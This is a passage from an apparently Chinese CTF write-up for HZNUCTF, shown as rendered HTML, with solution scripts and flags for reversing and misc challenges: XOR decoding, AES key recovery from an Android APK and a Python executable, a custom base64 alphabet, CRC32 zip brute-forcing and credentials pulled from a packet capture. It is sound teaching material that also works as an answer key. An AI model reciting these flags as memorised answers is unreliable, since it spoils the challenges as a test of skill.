class="number">5</span>] = <span class="number">101</span>;</span><br><span class="line">v15[<span class="number">6</span>] = <span class="number">119</span>;</span><br><span class="line">v15[<span class="number">7</span>] = <span class="number">74</span>;</span><br><span class="line">v15[<span class="number">8</span>] = <span class="number">99</span>;</span><br><span class="line">v15[<span class="number">9</span>] = <span class="number">2</span>;</span><br><span class="line"><span class="type">char</span> v16[] = <span class="string">&quot;n\0BnGTc&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(v15[i]^<span class="number">0x31</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(v16[i]^<span class="number">0x31</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// HZNUCTF&#123;R3_1s_veR</span></span><br></pre></td></tr></table></figure><p>后半段base64解码即可</p><p><img src="/./HZNUCTF/r_2_2.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HZNUCTF&#123;R3_1s_veRy_1nt3rest1ng@_@&#125;</span><br></pre></td></tr></table></figure><h2 id="babyandroid"><a href="#babyandroid" class="headerlink" title="babyandroid"></a>babyandroid</h2><p>反编译apk，可以看到我们输入的账户密码是AES加密的key和iv。</p><p><img src="/./HZNUCTF/r_5_1.png"></p><p><img src="/./HZNUCTF/r_5_2.png"></p><p>密文：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yjvAwO+OE3Ft5Fl5oK984D0xDlXTBMbvEuqno81AycYSGFnNZAQ4kwgU4n4p6MWh</span><br></pre></td></tr></table></figure><p>写脚本爆破出key和iv</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.hello.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">De_app</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[][] iArr = &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">214</span>, <span class="number">144</span>, <span class="number">233</span>, <span class="number">254</span>, <span class="number">204</span>, <span class="number">225</span>, <span class="number">61</span>, <span class="number">183</span>, <span class="number">22</span>, <span class="number">182</span>, <span class="number">20</span>, <span class="number">194</span>, <span class="number">40</span>, <span class="number">251</span>, <span class="number">44</span>, <span class="number">5</span>&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">43</span>, <span class="number">103</span>, <span class="number">154</span>, <span class="number">118</span>, <span class="number">42</span>, <span class="number">190</span>, <span class="number">4</span>, <span class="number">195</span>, <span class="number">170</span>, <span class="number">68</span>, <span class="number">19</span>, <span class="number">38</span>, <span class="number">73</span>, <span class="number">134</span>, <span class="number">6</span>, <span class="number">153</span>&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">156</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">244</span>, <span class="number">145</span>, <span class="number">239</span>, <span class="number">152</span>, <span class="number">122</span>, <span class="number">51</span>, <span class="number">84</span>, <span class="number">11</span>, <span class="number">67</span>, <span class="number">237</span>, <span class="number">207</span>, <span class="number">172</span>, <span class="number">98</span>&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">228</span>, <span class="number">179</span>, <span class="number">28</span>, <span class="number">169</span>, <span class="number">201</span>, <span class="number">8</span>, <span class="number">232</span>, <span class="number">149</span>, <span class="number">128</span>, <span class="number">223</span>, <span class="number">148</span>, <span class="number">250</span>, <span class="number">117</span>, <span class="number">143</span>, <span class="number">63</span>, <span class="number">166</span>&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">71</span>, <span class="number">7</span>, <span class="number">167</span>, <span class="number">252</span>, <span class="number">243</span>, <span class="number">115</span>, <span class="number">23</span>, <span class="number">186</span>, <span class="number">131</span>, <span class="number">89</span>, <span class="number">60</span>, <span class="number">25</span>, <span class="number">230</span>, <span class="number">133</span>, <span class="number">79</span>, <span class="number">168</span>&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">104</span>, <span class="number">107</span>, <span class="number">129</span>, <span class="number">178</span>, <span class="number">113</span>, <span class="number">100</span>, <span class="number">218</span>, <span class="number">139</span>, <span class="number">248</span>, <span class="number">235</span>, <span class="number">15</span>, <span class="number">75</span>, <span class="number">112</span>, <span class="number">86</span>, <span class="number">157</span>, <span class="number">53</span>&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">30</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">94</span>, <span class="number">99</span>, <span class="number">88</span>, <span class="number">209</span>, <span class="number">162</span>, <span class="number">37</span>, <span class="number">34</span>, <span class="number">124</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">33</span>, <span class="number">120</span>, <span class="number">135</span>&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">212</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">87</span>, <span class="number">159</span>, <span class="number">211</span>, <span class="number">39</span>, <span class="number">82</span>, <span class="number">76</span>, <span class="number">54</span>, <span class="number">2</span>, <span class="number">231</span>, <span class="number">160</span>, <span class="number">196</span>, <span class="number">200</span>, <span class="number">158</span>&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">234</span>, <span class="number">191</span>, <span class="number">138</span>, <span class="number">210</span>, <span class="number">64</span>, <span class="number">199</span>, <span class="number">56</span>, <span class="number">181</span>, <span class="number">163</span>, <span class="number">247</span>, <span class="number">242</span>, <span class="number">206</span>, <span class="number">249</span>, <span class="number">97</span>, <span class="number">21</span>, <span class="number">161</span>&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">224</span>, <span class="number">174</span>, <span class="number">93</span>, <span class="number">164</span>, <span class="number">155</span>, <span class="number">52</span>, <span class="number">26</span>, <span class="number">85</span>, <span class="number">173</span>, <span class="number">147</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">245</span>, <span class="number">140</span>, <span class="number">177</span>, <span class="number">227</span>&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">29</span>, <span class="number">246</span>, <span class="number">226</span>, <span class="number">46</span>, <span class="number">130</span>, <span class="number">102</span>, <span class="number">202</span>, <span class="number">96</span>, <span class="number">192</span>, <span class="number">41</span>, <span class="number">35</span>, <span class="number">171</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">78</span>, <span class="number">111</span>&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">213</span>, <span class="number">219</span>, <span class="number">55</span>, <span class="number">69</span>, <span class="number">222</span>, <span class="number">253</span>, <span class="number">142</span>, <span class="number">47</span>, <span class="number">3</span>, <span class="number">255</span>, <span class="number">106</span>, <span class="number">114</span>, <span class="number">109</span>, <span class="number">108</span>, <span class="number">91</span>, <span class="number">81</span>&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">141</span>, <span class="number">27</span>, <span class="number">175</span>, <span class="number">146</span>, <span class="number">187</span>, <span class="number">221</span>, <span class="number">188</span>, <span class="number">127</span>, <span class="number">17</span>, <span class="number">217</span>, <span class="number">92</span>, <span class="number">65</span>, <span class="number">31</span>, <span class="number">16</span>, <span class="number">90</span>, <span class="number">216</span>&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">10</span>, <span class="number">193</span>, <span class="number">49</span>, <span class="number">136</span>, <span class="number">165</span>, <span class="number">205</span>, <span class="number">123</span>, <span class="number">189</span>, <span class="number">45</span>, <span class="number">116</span>, <span class="number">208</span>, <span class="number">18</span>, <span class="number">184</span>, <span class="number">229</span>, <span class="number">180</span>, <span class="number">176</span>&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">137</span>, <span class="number">105</span>, <span class="number">151</span>, <span class="number">74</span>, <span class="number">12</span>, <span class="number">150</span>, <span class="number">119</span>, <span class="number">126</span>, <span class="number">101</span>, <span class="number">185</span>, <span class="number">241</span>, <span class="number">9</span>, <span class="number">197</span>, <span class="number">110</span>, <span class="number">198</span>, <span class="number">132</span>&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">24</span>, <span class="number">240</span>, <span class="number">125</span>, <span class="number">236</span>, <span class="number">58</span>, <span class="number">220</span>, <span class="number">77</span>, <span class="number">32</span>, <span class="number">121</span>, <span class="number">238</span>, <span class="number">95</span>, <span class="number">62</span>, <span class="number">215</span>, <span class="number">203</span>, <span class="number">57</span>, <span class="number">72</span>&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">int</span>[] iArr2 = &#123;<span class="number">54</span>, <span class="number">211</span>, <span class="number">36</span>, <span class="number">120</span>, <span class="number">87</span>, <span class="number">37</span>, <span class="number">88</span>, <span class="number">120</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">99</span>, <span class="number">135</span>, <span class="number">120</span>, <span class="number">162</span>, <span class="number">66</span>, <span class="number">66</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] iArr3 = &#123;<span class="number">28</span>, <span class="number">228</span>, <span class="number">28</span>, <span class="number">201</span>, <span class="number">228</span>, <span class="number">169</span>, <span class="number">179</span>, <span class="number">232</span>, <span class="number">28</span>, <span class="number">228</span>, <span class="number">28</span>, <span class="number">201</span>, <span class="number">228</span>, <span class="number">169</span>, <span class="number">169</span>, <span class="number">228</span>&#125;;</span><br><span class="line">        System.out.print(<span class="string">&quot;key: &quot;</span>);</span><br><span class="line">        bp(iArr,iArr2);</span><br><span class="line">        System.out.println();</span><br><span class="line">        System.out.print(<span class="string">&quot;iv: &quot;</span>);</span><br><span class="line">        bp(iArr,iArr3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bp</span><span class="params">(<span class="type">int</span>[][] iArr ,<span class="type">int</span>[] iArr1)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">128</span>;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(iArr[j / <span class="number">16</span>][j % <span class="number">16</span>] == iArr1[i])</span><br><span class="line">                &#123;</span><br><span class="line">                    System.out.print((<span class="type">char</span>)(j));</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// key: yuanshenqidong!!</span></span><br><span class="line"><span class="comment">// iv: 2024031620240330</span></span><br></pre></td></tr></table></figure><p>AES解密，即可得到flag。</p><p><img src="/./HZNUCTF/r_5_3.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HZNUCTF&#123;welc0m3_2_4ndro1d_r3verse_?O.o_o.O?&#125;</span><br></pre></td></tr></table></figure><h2 id="easyPY"><a href="#easyPY" class="headerlink" title="easyPY"></a>easyPY</h2><p>反编译exe，再将ezpy文件头修补成python 3.11的头。</p><p>反编译pyc，发现反编译不完整，但能看到key和iv生成的函数。</p><p><img src="/./HZNUCTF/r_4_1.png"></p><p>将<code>ezpy.pyc</code>包含进脚本里，再次调用这两个函数，即可得到key和iv。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ezpy <span class="keyword">import</span> IV,Key</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line">key = Key().encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">iv = IV(<span class="number">0</span>, <span class="number">15</span>).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">key, plaintext, iv=(<span class="params"><span class="literal">None</span>,</span>)</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv=iv) <span class="keyword">if</span> iv <span class="keyword">else</span> AES.new(key, AES.MODE_CBC)</span><br><span class="line">    ciphertext = cipher.decrypt(plaintext)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;68fcb549ee313b964d5eea2d3dedea23e87e4e89a675ff46698ed29b191ffe19f5bac00e0eb5dedcc8be847356d93eb8&quot;</span></span><br><span class="line"></span><br><span class="line">ciphertext = decrypt(key, <span class="built_in">bytes</span>.fromhex(enc), iv)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HZNUCTF&#123;w4wawa_Pyth0n_1s_To0_2_ea3y&#125;\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="你懂流量吗"><a href="#你懂流量吗" class="headerlink" title="你懂流量吗"></a>你懂流量吗</h2><p>分析流量，搜素关键字<code>username</code>，可以找到账户密码为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin:TPShop6.0</span><br></pre></td></tr></table></figure><p>再将密码<code>TPShop6.0</code>作为关键字搜素，可以看到密码出现在<code>README</code>文件里。</p><p>flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HZNUCTF&#123;admin_TPShop6.0_README&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-base64"><a href="#ez-base64" class="headerlink" title="ez_base64"></a>ez_base64</h2><p>先是0宽，解出来发现这两个base64的长度一样且重复字符出现的位置也一样，猜测base64换表</p><p><img src="/./HZNUCTF/m_2_1.png"></p><p>写脚本弄出码表再base64解码即可得到flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">x1 = <span class="string">&quot;6L+Z5Lu956yU6K6w55qE5Yid6KG35piv5oOz5oqK5p2t5biI5aSn55qE572R57uc5a6J5YWo6Zif5LyN5YGa5aSn5YGa5by677yM5LiN5b+N5YmN6L6I5ZKM5ZC+562J55qE5b+D6KGA5LuY6K+45Lic5rWB77yM5a+E5biM5pyb5LqO5ZCO6L6I77yM5bm26Lip5Zyo5oiR5Lus55qE6IKp6IaA5LiK77yM5oqK5p2t5biI5aSn5bim5Yiw5pu05aSn5pu06auY55qE5bmz5Y+w77yM6L+Z5Lu95bel5L2c5rC46L+c5LiN5piv5LiA5Liq5Lq655qE5LqL5oOF44CC6Jm95Y2D5LiH5Lq65ZC+4oCc5Lus4oCd5b6A55+j77yM5YWx5YuJ44CC5paH5qGj55qE5Yid6KG35YaZ5Zyo56m66Ze055qE566A5LuL6YeM44CC5YWI5bid5Yib5Lia5pyq5Y2K6ICM5Lit6YGT5q+V5Lia5LqG77yM5aSN5YW05p2t5biI55qE6YeN5Lu756qB54S25bCx6JC95Zyo5oiR5Lus5aS05LiK77yM5q+P5q+P5oOz6LW35q2k5LqL77yM5bCx5LiO6aKc5oC755eb5pal5LiA55Wq5LiL5LiA5bGK5oiQ5ZGY55qE5LiN5Yqq5Yqb5ZKM5LiN5L2c5Li677yM5Y205Lmf5Y+55oGv5rKh6IO95ou/5Yiw5pu05aW955qE5oiQ57up44CC5a2m5Lmg5oC75b2S5piv6KaB57+76L+H5LiA5bqn5Y+I5LiA5bqn5bGx55qE77yM5pyJ55qE5Lq655WZ5Zyo5bGx5LiL77yM5b2T5L2g5Zue5aS055yL5LuW5Lus6L+Y55WZ5Zyo5bGx5LiL55qE5pe25YCZ5Lya5ruh5piv56yR6K+d44CC56ue6LWb6Ieq54S25piv5Y+v5Lul6K6p57up54K55pu05LiK5LiA5bGC5qW855qE5Y+w6Zi277yM5L2G5a6e5Yqb5LuN5piv5pyA6YeN6KaB55qE77yM5Y+m5aSW6Zif5LyN55qE5aOu5aSn6ZyA6KaB5q+P5LiA5Liq5Lq655qE5Yqq5Yqb77yM6Zif5LyN6YeM5LiN6IO95bi45pyJ5Lq65LiN5LuY5Ye677yM5Y205Z2Q5Lqr5LuW5Lq65LmL5oiQ77yM6L+Z5peg55aR5b2x5ZON5pW05Y+q6Zif5LyN55qE5oiQ57up77yM5LiH5LiN5b6X5YGa5Luk5Lq66K+f55eF55qE5LqL77yM6KaB5LmI5Yqq5Yqb5YGa5Ye66LSh54yu77yM6KaB5LmIT1VU44CC&quot;</span></span><br><span class="line"></span><br><span class="line">x2 = <span class="string">&quot;4O+C1Ox514bX4N4z11tH1Blg4NJ21sly1rRa1rtN1s9w1elL1dVq11tH109U10xf1d4M1BZr4Cli1ObQ1BJd1dVq1BJd1eb400bP1OlQ1e+Q1BpQ4O4L1CNP1CE+149M11tH1e+D4NJG1OxB4N+71Olf1uZF00bP1d+H1elP1sbe1OtR1CER4O4L00bP1ep94Ols1Cbr1rlU1Oxv11tH4LNs4LdG1OlN00bP1rtN1s9w1elL1dVq1elp1Blz1sx31dVq1sx34dxB11tH1epa1B+z00bP4O+C1Ox51eho1O9f1uE74O+f1OlQ1sly1OlG1Olt1Ot411tH1OtO1rRI77EE4Mp51B9D1OlK1Ot41CE+7rEf1Oxv7rEg1e4G11+m00bP1BZc1BxM77EE1sdK1tJm11tH1Blg4NJ21BdC1Cbr14p44Ch311tH144G1OxO4BhP77EE1BZL1elg1Ble1Old1sbt1B9N4LEP1Olw4BJW1t+Y1Old1OtJ00bP1dVQ1BZ31s9w1elL11tH4BhQ1Ox014tF17V91eEc4ME51Cbr1rlU1Oxv1dV31OlN00bP1t+S1t+S1rRa4OZ21t9n1OtO00bP1eEc1OlR4dNf1rE011he1sdo1OlG11Zt1OlO1OlG1eJN1rlT1CJB11tH1OlQ1Btt1Bte1CNP1OlQ1O9f1Ol400bP1B931Opi1B+11rJy1uNk4LR51rx/1Blz1sx31dZ511tH1rlT10xs77EE1d9p1Opj1rE01e9V1sly4NdF10+04O+K1OlG1etq1B+L1OlG1etq1eJc11tH00bP1sbM11tH1Ot411ZC1Cbr1eJc1OlO00bP1e9W1O9j1Cxh1dV311bO1OxZ1Oxv4O+B11ZC1Cbr1eJc1OlO11tH1sh91BEC1Obd1uxk1sly14bU4N+g77EE14xh4OZe4Lht17V91sly1B+y1Oxo4N4s10xs17N11sx31OlN1OlG1eJE1tZ611tH1B+z4Cl900bP1O9J1d4h1Bte1OxQ1sly1sbG4BhQ4NdF11tH00bP1B+p1dVZ4Cli1ObQ11tH1dRx1dVq4CbG4NdF1t+S1OlG1Olt1Ot411tH1Btt1Bte00bP4Cli1ObQ4BhP1OlQ4LR51el71sbM1Ot41OlQ1OxB1Bh400bP1B931C9T1Otu1OxZ1Ot41OpO1rlT00bP4O+C1shj11dU1e9c1CRQ1sZ31B+t4Cli1ObQ11tH1rlT10xs00bP1OlK1OlQ1e4A1BJd1Oxn1Ot44N+i11hI11tH1OtO00bP4NdF1OpL1Btt1Bte1BJd1Bh44OVk17bx00bP4NdF1OpLW8YX77EE&quot;</span></span><br><span class="line"></span><br><span class="line">key = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x1)):</span><br><span class="line">    <span class="keyword">if</span> x1[i] <span class="keyword">not</span> <span class="keyword">in</span> key :</span><br><span class="line">        key[x1[i]]=x2[i]</span><br><span class="line">       </span><br><span class="line">enc = <span class="string">&quot;PBmLSRKROkqwJB2wQ52Qy52BNEKWU7GXx3R3KZB2&quot;</span></span><br><span class="line">list_enc = <span class="built_in">list</span>(enc)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(list_enc)):</span><br><span class="line">    list_enc[i] = key[list_enc[i]]</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&#x27;&#x27;</span>.join(list_enc)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(enc))</span><br><span class="line"><span class="comment"># HZNUCTF&#123;s0_sO_So_E@sY_B@se64!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ez-CRC"><a href="#ez-CRC" class="headerlink" title="ez_CRC"></a>ez_CRC</h2><p>根据每个文件的crc值爆破出里面的内容，再根据文件名把他们拼接起来得到base64</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> crc32</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">dic=string.printable</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CrackCrc</span>(<span class="params">crcs,fileList</span>):</span><br><span class="line">    crc32_data=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic :</span><br><span class="line">        <span class="comment"># print (i)</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                    s=i+j+p+q</span><br><span class="line">                    crc = (crc32(<span class="built_in">bytes</span>(s,<span class="string">&#x27;ascii&#x27;</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">                    <span class="comment"># print (crc32(bytes(s,&#x27;ascii&#x27;)) &amp; 0xffffffff)</span></span><br><span class="line">                    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(crcs)):</span><br><span class="line">                        <span class="comment">#print(crcs[idx])</span></span><br><span class="line">                        <span class="keyword">if</span> crcs[idx] == crc:</span><br><span class="line">                            <span class="built_in">print</span>(fileList[idx],crc)</span><br><span class="line">                            crc32_data[<span class="built_in">int</span>(fileList[idx].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>])] = s</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> crc32_data</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getcrc32</span>(<span class="params">fname</span>):</span><br><span class="line">    l=[]</span><br><span class="line">    file = fname</span><br><span class="line">    f = zipfile.ZipFile(file, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">global</span> fileList</span><br><span class="line">    fileList =f.namelist ()</span><br><span class="line">    <span class="comment">#print (fileList)</span></span><br><span class="line">    <span class="comment"># print (type(fileList))</span></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> fileList:</span><br><span class="line">        Fileinfo = f.getinfo(filename)</span><br><span class="line">        <span class="comment"># print(Fileinfo)</span></span><br><span class="line">        crc = Fileinfo.CRC</span><br><span class="line">        <span class="comment"># print (&#x27;crc&#x27;,crc)</span></span><br><span class="line">        l.append(crc)</span><br><span class="line">    <span class="keyword">return</span> l</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span> (filename=<span class="literal">None</span>):</span><br><span class="line">    l = getcrc32(filename)</span><br><span class="line">    <span class="comment"># print(l)</span></span><br><span class="line">    crc32_data = CrackCrc(l,fileList)</span><br><span class="line">    <span class="built_in">print</span>(crc32_data)</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(crc32_data)+<span class="number">1</span>):</span><br><span class="line">        flag += crc32_data[i]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__  == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main (<span class="string">&#x27;test.zip&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JUNDIVpRU0MofVhUWk84N0hDXVBSX0g0VDdERlZUR0hVK05aX11AQyl7OUZXWlx7UjtjKXtdXEhBJkszU1V7Lzs0VSNZVXpUXEooM3tZU0YoWH1DNFAyRXtFI1khe1lWQzY5U2NFTltSWUBVSCMmY0hJSEUkRSE2SntMVE1BXztZM0gyezZTVUQxSEM2RkRdejR9Tl8rMVtDX0ZKQzF6TComQztaRFR7VFpCR3tAIWMlKFVaXjMvWUN7RU45VjlZL1VMMXt9VkNUXzgrRTROX0hJe0JjW1VSfTI3M3slRkVaIUBITjkpVGNSY0hDSCNHTlVGOExaWEVDTntISEtCU1NaRFNYTTcyTlkkQSFdSn1AWjVOKkAlWTFORjUxWUNYQFRfRntTXSZHTU1UKiQ1TkdITk5ZVCZVS1p7VEVIY05GMk5TQFdQNFFNSDlIVlooT1pVX1I4Rlljei9RfV5MQE5UVSZaVlFVVTd6QVAyelRXW1MkM1VDJF5UQENESFRFWl5FRVBUVGNTUVBaQ1d6SF84Uk5cTllAMzYyVVVPWkVFI05GQlc1KUljQC8qKiNCKEZOK0t6KTgrQypDN0JOK09IW0VaRjNUSWNfQEFYMzJUX1o1RjV7X1pGSEZAUnokVV9aW09TXkxaNkBRLztXSlpOKUhLT1JKU0NHWkZOVVJBY0t6RkBVQElSXlVFSEk7WVVTJUhGU0VSTSUlQ0MhWlFTQyh9WFRaTzg3SENdUFJfSDRUN0RGVlRHSFUrTlpfXUBDKXs5RldaXHtSO2Mpe11cSEEmSzNTVXsvOzRVI1lVelRcSigze1lTRihYfUM0UDJFe0UjWSF7WVZDNjlTY0VOW1JZQFVIIyZjSElIRSRFITZKe0xUTUFfO1kzSDJ7NlNVRDFIQzZGRF16NH1OXysxW0NfRkpDMXpMKiZDO1pEVHtUWkJHe0AhYyUoVVpeMy9ZQ3tFTjlWOVkvVUwxe31WQ1RfOCtFNE5fSEl7QmNbVVJ9MjczeyVGRVohQEhOOSlUY1JjSENII0dOVUY4TFpYRUNOe0hIS0JTU1pEU1hNNzJOWSRBIV1KfUBaNU4qQCVZMU5GNTFZQ1hAVF9Ge1NdJkdNTVQqJDVOR0hOTllUJlVLWntURUhjTkYyTlNAV1A0UU1IOUhWWihPWlVfUjhGWWN6L1F9XkxATlRVJlpWUVVVN3pBUDJ6VFdbUyQzVUMkXlRAQ0RIVEVaXkVFUFRUY1NRUFpDV3pIXzhSTlxOWUAzNjJVVU9aRUUjTkZCVzUpSWNALyoqI0IoRk4rS3opOCtDKkM3Qk4rT0hbRVpGM1RJY19AQVgzMlRfWjVGNXtfWkZIRkBSeiRVX1pbT1NeTFo2QFEvO1dKWk4pSEtPUkpTQ0daRk5VUkFjS3pGQFVASVJeVUVISTtZVVMlSEZTRVJNJQ==</span><br></pre></td></tr></table></figure><p>base64解码后再去字频统计，即可得到flag。</p><p><img src="/./HZNUCTF/m_3_1.png"></p><h2 id="ez-pyc"><a href="#ez-pyc" class="headerlink" title="ez_pyc"></a>ez_pyc</h2><p>让GPT分析并给出代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">34</span>, <span class="number">44</span>, <span class="number">72</span>]</span><br><span class="line">output = [<span class="number">106</span>, <span class="number">118</span>, <span class="number">6</span>, <span class="number">119</span>, <span class="number">111</span>, <span class="number">28</span>, <span class="number">100</span>, <span class="number">87</span>, <span class="number">120</span>, <span class="number">18</span>, <span class="number">13</span>, <span class="number">23</span>, <span class="number">91</span>, <span class="number">28</span>, <span class="number">61</span>, <span class="number">125</span>, <span class="number">104</span>, <span class="number">39</span>, <span class="number">125</span>, <span class="number">29</span>, <span class="number">60</span>, <span class="number">3</span>, <span class="number">81</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;welcome to HZNUCTF&#x27;</span>)</span><br><span class="line">str1 = <span class="built_in">input</span>(<span class="string">&#x27;please input your string:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(str1) != <span class="number">4</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;lenth wrong!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(str1[<span class="number">0</span>]) * <span class="built_in">ord</span>(str1[<span class="number">1</span>]) + <span class="built_in">ord</span>(str1[<span class="number">2</span>]) * <span class="built_in">ord</span>(str1[<span class="number">3</span>]) == <span class="number">512144</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;good! continue!&#x27;</span>)</span><br><span class="line">    <span 